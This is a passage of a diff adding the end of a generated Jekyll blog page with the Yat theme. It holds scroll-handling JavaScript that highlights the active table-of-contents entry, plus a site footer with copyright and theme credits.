+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
+</section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2020-2022 @Jeevan</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      
+    </div>
+  </div>
+</footer>
+</body>
+</html>
